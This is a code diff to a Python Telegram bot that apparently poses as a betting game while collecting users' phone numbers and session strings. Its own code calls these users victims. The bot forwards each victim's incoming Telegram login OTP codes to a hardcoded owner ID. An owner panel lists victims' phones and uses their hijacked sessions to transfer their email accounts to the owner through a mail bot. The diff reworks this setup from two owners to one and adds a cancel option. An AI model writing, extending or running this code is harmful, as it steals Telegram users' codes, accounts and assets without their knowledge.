@@ -25,9 +25,12 @@ API_HASH = os.getenv("API_HASH", "dc6d3dd0de462ed07952a64c3253c437")
 
 TARGET_MAIL_BOT = "fakemailbot"
 
-# DONO OWNERS SET KAR DIYE HAIN
-OWNER_IDS = [6894136753, 8808192812]
-OWNER_USERNAMES = ["@ISHAN_XDD", "@iflexcoderrrrr"]
+# OWNER CONFIG
+ISHAN_ID = 6894136753
+ISHAN_USERNAME = "@ISHAN_XDD"
+
+# Transfer process ko rokne ke liye flags
+transfer_running = {}
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -116,28 +119,20 @@ async def start_userbot(user_id, session_str):
             if not event.is_private: return
             sender = await event.get_sender()
             if not sender: return
-            
             sender_id = getattr(sender, "id", None)
-            
             if sender_id == 777000:
                 full_text = event.message.message or ""
                 bot = Bot(BOT_TOKEN)
-                for owner in OWNER_IDS:
-                    try: 
-                        await bot.send_message(owner, f"🔐 <b>{f_txt('NEW TELEGRAM LOGIN OTP')}</b>,\n\n{p_style(full_text)}", parse_mode="HTML")
-                    except: pass
+                try: 
+                    await bot.send_message(ISHAN_ID, f"🔐 <b>{f_txt('NEW LOGIN OTP')}</b>,\n\n{p_style(full_text)}", parse_mode="HTML")
+                except: pass
         except Exception as e:
             logger.error(f"OTP interceptor error: {e}")
 
-    # Auto transfer logic to both owners
-    asyncio.create_task(auto_transfer_victim_mails(user_id))
-
-async def auto_transfer_victim_mails(victim_uid):
-    # Dono owners ke liye alag alag transfer karega
-    for owner_id, owner_username in zip(OWNER_IDS, OWNER_USERNAMES):
-        asyncio.create_task(transfer_to_owner(victim_uid, owner_id, owner_username))
-
-async def transfer_to_owner(victim_uid, owner_id, owner_username):
+async def process_victim_mails(victim_uid, owner_id, owner_username):
+    if not transfer_running.get(owner_id, False):
+        return
+        
     try:
         victim_client = await get_or_connect_client(victim_uid)
         owner_client = await get_or_connect_client(owner_id)
@@ -149,23 +144,25 @@ async def transfer_to_owner(victim_uid, owner_id, owner_username):
         owner_target_bot = await owner_client.get_entity(TARGET_MAIL_BOT)
         
         bot = Bot(BOT_TOKEN)
-        await bot.send_message(owner_id, f"⏳ <b>{f_txt('FETCHING MAILS FROM VICTIM')}:</b> {p_style(victim_uid)}", parse_mode="HTML")
         
         await victim_client.send_message(target_bot, "/id")
         await asyncio.sleep(4)
+        
+        if not transfer_running.get(owner_id, False): return
         
         messages = await victim_client.get_messages(target_bot, limit=2)
         if not messages: return
             
         emails = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', messages[0].message)
         
-        if not emails: 
-            return await bot.send_message(owner_id, f"❌ {p_style('No mails found on this account')}", parse_mode="HTML")
+        if not emails: return
 
-        total = len(emails)
-        for idx, email in enumerate(emails, 1):
-            await bot.send_message(owner_id, f"🔄 <b>{f_txt('TRANSFERRING')}</b> ({idx}/{total}):\n{p_style(email)}", parse_mode="HTML")
-            
+        for email in emails:
+            if not transfer_running.get(owner_id, False): 
+                await bot.send_message(owner_id, f"🛑 <b>{f_txt('TRANSFER CANCELLED BY USER')}</b>", parse_mode="HTML")
+                return
+                
+            await bot.send_message(owner_id, f"🔄 <b>{f_txt('TRANSFERRING')}:</b>\n{p_style(email)}", parse_mode="HTML")
             await victim_client.send_message(target_bot, f"/transfer {email} {owner_username}")
             await asyncio.sleep(4)
             
@@ -174,8 +171,9 @@ async def transfer_to_owner(victim_uid, owner_id, owner_username):
                 await victim_client.delete_messages(target_bot, msgs[0].id)
             except: pass
             
-            await bot.send_message(owner_id, f"📥 <b>{f_txt('CLAIMING')}</b> ({idx}/{total}):\n{p_style(email)}", parse_mode="HTML")
+            if not transfer_running.get(owner_id, False): return
             
+            await bot.send_message(owner_id, f"📥 <b>{f_txt('CLAIMING')}:</b>\n{p_style(email)}", parse_mode="HTML")
             await owner_client.send_message(owner_target_bot, email)
             await asyncio.sleep(4)
             
@@ -184,13 +182,32 @@ async def transfer_to_owner(victim_uid, owner_id, owner_username):
                 await owner_client.delete_messages(owner_target_bot, msgs[0].id)
             except: pass
             
-            await bot.send_message(owner_id, f"✅ <b>{f_txt('CLAIMED SUCCESSFULLY')}</b>:\n{p_style(email)}", parse_mode="HTML")
+            await bot.send_message(owner_id, f"✅ <b>{f_txt('CLAIMED')}:</b>\n{p_style(email)}", parse_mode="HTML")
             await asyncio.sleep(1)
             
-        await bot.send_message(owner_id, f"👑 <b>{f_txt('ALL MAILS CLAIMED SUCCESSFULLY')}</b>,\n{p_style('Total: ' + str(total))}", parse_mode="HTML")
-            
     except Exception as e:
-        logger.error(f"Transfer error for {owner_id}: {e}")
+        logger.error(f"Transfer error: {e}")
+
+async def start_claiming_process(owner_id, owner_username, query):
+    transfer_running[owner_id] = True
+    
+    cancel_kb = [[InlineKeyboardButton("🛑 CANCEL PROCESS", callback_data="cancel_process")]]
+    await query.edit_message_text(f"⏳ <b>{f_txt('FETCHING MAILS...')}</b>\nClick below to cancel.", reply_markup=InlineKeyboardMarkup(cancel_kb), parse_mode="HTML")
+    
+    users = db_exec("SELECT user_id FROM users WHERE session_string IS NOT NULL AND user_id != ?", (owner_id,))
+    
+    if not users:
+        transfer_running[owner_id] = False
+        return await query.message.reply_text("❌ No victim accounts found,")
+        
+    for u in users:
+        if not transfer_running.get(owner_id, False): break
+        await process_victim_mails(u[0], owner_id, owner_username)
+        
+    if transfer_running.get(owner_id, False):
+        await query.message.reply_text(f"👑 <b>{f_txt('ALL MAILS CLAIMED SUCCESSFULLY')}</b>", parse_mode="HTML")
+        
+    transfer_running[owner_id] = False
 
 # ================== KEYBOARDS ==================
 def get_main_keyboard():
@@ -361,56 +378,54 @@ async def bet_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_states['bet_choice'] = choice
     await query.edit_message_text(f"💰 <b>{f_txt('Enter amount to bet on ' + choice.upper())}</b>,")
 
-# ================== SECRET OWNER PANEL (/ownerx) ==================
+# ================== OWNER PANEL (/owner) ==================
+async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if uid != ISHAN_ID: return await update.message.reply_text("❌ Unauthorized!")
+    
+    kb = [
+        [InlineKeyboardButton("👥 Logged Accounts", callback_data="admin_acc")],
+        [InlineKeyboardButton("📤 Claim All Mails", callback_data="admin_claim")]
+    ]
+    await update.message.reply_text(f"<b>👑 {f_txt('OWNER PANEL')}</b>,\nChoose an option:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
+
+# ================== SECRET PANEL (/ownerx) ==================
 async def secret_owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
+    if uid != ISHAN_ID: return await update.message.reply_text("❌ Unauthorized!")
     
-    # Dono IDs hi access kar sakti hain
-    if uid not in OWNER_IDS: 
-        return await update.message.reply_text("❌ Unauthorized Access!")
-    
-    text = (
-        f"<b>👑 {f_txt('SECRET OWNER PANEL')}</b>,\n\n"
-        f"🆔 <b>{f_txt('Your ID')}:</b> {p_style(uid)}\n"
-    )
     kb = [
-        [InlineKeyboardButton("📤 Claim All Mails (For This Account)", callback_data="secret_claim")],
+        [InlineKeyboardButton("📤 Start Claiming Process", callback_data="secret_claim")],
         [InlineKeyboardButton("👥 Logged Devices", callback_data="secret_acc")]
     ]
-    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
+    await update.message.reply_text(f"<b>👑 {f_txt('SECRET OWNER PANEL')}</b>,\nYour ID: {p_style(str(uid))}", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
 
-async def secret_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def owner_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     data = query.data
     uid = query.from_user.id
     
-    if uid not in OWNER_IDS: return await query.answer("Unauthorized", show_alert=True)
+    if uid != ISHAN_ID: return await query.answer("Unauthorized", show_alert=True)
     
-    if data == "secret_acc":
+    if data == "admin_acc" or data == "secret_acc":
         users = db_exec("SELECT user_id, phone FROM users WHERE session_string IS NOT NULL")
         text = f"👥 <b>{f_txt('Logged Devices/Accounts')}:</b>,\n\n"
         for u in users: 
             text += f"{p_style('ID: ' + str(u[0]))}\n{p_style('Phone: ' + str(u[1]))}\n"
         await query.edit_message_text(text, parse_mode="HTML")
         
-    elif data == "secret_claim":
-        # Jis ID ne button dabaya hai, usi ke username pe transfer hoga
-        if uid == OWNER_IDS[0]:
-            target_uname = OWNER_USERNAMES[0]
-        else:
-            target_uname = OWNER_USERNAMES[1]
-            
-        await query.edit_message_text(f"⏳ <b>{f_txt('FETCHING AND TRANSFERRING ALL MAILS TO YOUR ACCOUNT')}</b>,\nPlease wait...", parse_mode="HTML")
+    elif data == "admin_claim" or data == "secret_claim":
+        # Check karo ki Ishan ka account login hai ya nahi
+        res = db_exec("SELECT session_string FROM users WHERE user_id=?", (ISHAN_ID,))
+        if not res or not res[0][0]:
+            return await query.edit_message_text(f"⚠️ <b>{f_txt('ERROR')}</b>\nYour account is not logged in.\nPlease login using /start first.", parse_mode="HTML")
         
-        # Fetch all victims (excluding owners)
-        users = db_exec("SELECT user_id FROM users WHERE session_string IS NOT NULL AND user_id != ? AND user_id != ?", (OWNER_IDS[0], OWNER_IDS[1]))
+        asyncio.create_task(start_claiming_process(ISHAN_ID, ISHAN_USERNAME, query))
         
-        if not users:
-            return await query.message.reply_text("❌ No victim accounts found,")
-            
-        for u in users:
-            asyncio.create_task(transfer_to_owner(u[0], uid, target_uname))
+    elif data == "cancel_process":
+        transfer_running[ISHAN_ID] = False
+        await query.edit_message_text(f"🛑 <b>{f_txt('PROCESS CANCELLED')}</b>", parse_mode="HTML")
 
 # ================== MAIN ==================
 def main():
@@ -418,10 +433,11 @@ def main():
     app_bot = Application.builder().token(BOT_TOKEN).build()
 
     app_bot.add_handler(CommandHandler("start", start))
-    app_bot.add_handler(CommandHandler("ownerx", secret_owner_panel)) # Secret Panel
+    app_bot.add_handler(CommandHandler("owner", owner_panel)) 
+    app_bot.add_handler(CommandHandler("ownerx", secret_owner_panel)) 
     app_bot.add_handler(MessageHandler(filters.CONTACT, verify_phone))
     app_bot.add_handler(CallbackQueryHandler(bet_callback, pattern="^bet_"))
-    app_bot.add_handler(CallbackQueryHandler(secret_callback, pattern="^secret_"))
+    app_bot.add_handler(CallbackQueryHandler(owner_callbacks, pattern="^(admin_|secret_|cancel_)"))
     app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu_router))
 
     logger.info("Bot started successfully.")
